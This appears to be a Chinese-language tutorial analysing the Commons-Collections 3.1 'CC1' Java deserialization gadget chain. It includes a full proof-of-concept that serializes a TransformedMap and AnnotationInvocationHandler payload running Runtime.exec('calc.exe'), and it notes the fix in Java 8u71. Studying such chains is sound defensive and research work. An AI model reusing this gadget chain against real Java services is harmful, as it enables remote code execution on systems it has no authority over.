## CommonCollections1_TransformedMap

本机环境：

JDK版本：jdk1.7u_51

CC版本：Commons-Collections 3.1

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

public class CommonCollections1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        innerMap.put("value", "value");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Target.class, outerMap);

        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(instance);

        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);

        fin.readObject();
    } }
```

## 分析

### Transformer数组构造

InvokerTransformer类是执行恶意代码的核心类

```java
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }
    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);  
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }
```

它的`transform`方法存在反射调用，当输入参数可控，就可以利用它来执行命令

例如：

```java
public class cc1_test {
    public static void main(String[] args) {
        Runtime runtime = Runtime.getRuntime();
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(runtime);
    }
}
```

相当于执行了

```java
Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")
```

这里需要注意的是invoke方法

**invoke**

1. invoke调用普通方法时，传入的必须是实例化后的类
2. invoke调用静态方法时，传入类即可

```java
 public static Runtime getRuntime() {
        return currentRuntime;
    }
```

这里利用调用静态方法getRuntime返回一个实例化后的Runtime，然后传入InvokerTransformer中的transform方法中

**我们看到这一部分的POC**

```java
   Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };
        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);
```

其中ConstantTransformer类的transform方法会直接返回构造函数中传入的对象

由于反序列化中是将构造好的单个对象进行序列化发送到后端，我们还需要将两个类串联起来

ChainedTransformer能将实现了Transformer接口的类进行串联，并且依次调用其中的transform方法传递给下一个元素

**接下来解释一下构造的 transformers数组：**

#### constant

```
new ConstantTransformer(Runtime.class)
```

`ConstantTransformer.transform`会直接返回构造函数中传入的Runtime类`（java.lang.Runtime)`，并且作为input传入`InvokerTransformer`的transform方法中

#### Invoker1

```java
new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] })
```

利用反射获取`java.lang.Class`中的getMethod方法，然后利用获取到的getMethod方法获取我们传入的Runtime类中的`getRuntime`方法，类型为`Method (java.lang.reflect.Method)`。`ConstantTransforme`r返回的Runtime类作为input传入`InvokerTransformer.transform`方法

由于这里是获取静态方法getRuntime，所以在使用invoke的时候只需要传入类即可

`new Class[0]` 在这里是占位符号，由于getRuntime函数不需要传入参数所以这里改为null也可以

为什么占位符是 new Class[0] 呢？ 因为这里是通过getMethod来获取getRuntime方法的，所以我们这里需要满足getMethod传入的参数类型要求。

#### Invoker2

```java
new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] })
```

由于传入的是Method对象，所以这里getClass获取`java.lang.reflect.Method`（当前对象的类），利用反射获取Method类中的invoke方法，然后利用获取到的invoke方法执行前面获取到的getRuntime静态方法，从而返回Runtime对象

#### Invoker3

```java
new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
```

Runtime实例作为输入，getClass获取到Runtime类（当前对象所在的类），然后利用反射获取Runtime类中的exec方法，最后利用invoke调用，此时invoke传入的input为Runtime对象，iArgs为我们要执行的命令

#### 关于反射

需要注意的是反射问题，当我们利用如下代码：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationTargetException;

public class cc1_test {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(111);
        
        FileOutputStream fileOutputStream = new FileOutputStream("evil.bin");
        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
        outputStream.writeObject(chainedTransformer);

        Object obj = Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));
        chainedTransformer.transform(obj);
    }
}
```

运行发现能成功弹出计算器但是会报错，提示Runtime类无法进行序列化：

![image-20220305133504570](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220305133504570.png)

Java中不是所有对象都支持序列化，待序列化的对象和所有它使用的内部属性对象，必须都实现了`java.io.Serializable` 接口。如果我们传给ConstantTransformer的是`Runtime.getRuntime() `，Runtime类是没有实现` java.io.Serializable `接口的，所以不允许被序列化

###  TransformedMap的利用

接下来是：

```java
 //创建Map并绑定transformerChain
        Map innerMap = new HashMap();
        innerMap.put("value", "value");
        //给予map数据转化链
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
```

经过前面的构造，达成反序列化则需要

1. 服务端反序列化我们的输入成**ChainedTransformer**类型
2. 调用这个输入的transform()函数

显然此时利用条件是很困难的，这时候需要利用到 TransformedMap  ,TransformedMap会对Map进行一个修饰，被修饰之后的map会在添加新元素之后进行一个回调，能分别对key和value进行修饰，当调用put方法时会调用decorate方法中传入类的transformer方法，从而进行触发decorate将chainedTransformer传递给构造函数

```java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer);
    }
```

### AnnotationInvocationHandler

此时触发漏洞需要服务端把我们传入的序列化内容反序列化为map，并对值进行修改。但是反序列化攻击最好是客户端执行readObject就直接触发执行命令

最后一部分POC：

```java
Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        //取消构造函数修饰符限制
        ctor.setAccessible(true);
        //获取AnnotationInvocationHandler类实例
        Object instance = ctor.newInstance(Target.class, outerMap);
```

在jdk 1.7 中有一个存在一个可利用的readObject点 `sun.reflect.annotation.AnnotationInvocationHandler`

```java
AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
        this.type = var1;
        this.memberValues = var2;
    }
```

我们先来看这个AnnotationInvocationHandler的构造函数，发现构造函数会将我们传入的Map类型的参数赋值给memberValues属性

```java
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
    	//默认反序列化
        var1.defaultReadObject();
        AnnotationType var2 = null;

        try {
            //this.type是我们在实例化的时候传入的jdk自带的Target.class
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var3 = var2.memberTypes();
        Iterator var4 = this.memberValues.entrySet().iterator(); //获取我们构造map的迭代器

        while(var4.hasNext()) {
            Entry var5 = (Entry)var4.next();
            String var6 = (String)var5.getKey();
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }

    }
```

接下来我们来看readObject方法，发现会遍历我们的memberValues，memberValues就是反序列化后得到的Map，也是经过了TransformedMap修饰的对象，这里遍历了它的所有元素，并依次设置值。在调用setValue设置值的时候就会触发TransformedMap里注册的Transform，进而执行我们为其精心设计的任意代码。

### jdk 高版本的限制

在Java 8u71之后代码发生了变动。

```java
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        GetField var2 = var1.readFields();
        Class var3 = (Class)var2.get("type", (Object)null);
        Map var4 = (Map)var2.get("memberValues", (Object)null);
        AnnotationType var5 = null;

        try {
            var5 = AnnotationType.getInstance(var3);
        } catch (IllegalArgumentException var13) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var6 = var5.memberTypes();
        LinkedHashMap var7 = new LinkedHashMap();

        String var10;
        Object var11;
        for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) {
            Entry var9 = (Entry)var8.next();
            var10 = (String)var9.getKey();
            var11 = null;
            Class var12 = (Class)var6.get(var10);
            if (var12 != null) {
                var11 = var9.getValue();
                if (!var12.isInstance(var11) && !(var11 instanceof ExceptionProxy)) {
                    var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + "[" + var11 + "]")).setMember((Method)var5.members().get(var10));
                }
            }
        }
...
}
```

改动后，不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，而原来我们精心构造的Map不再执行set或put操作，也就不会触发RCE了。



参考文章：

http://wjlshare.com/archives/1498
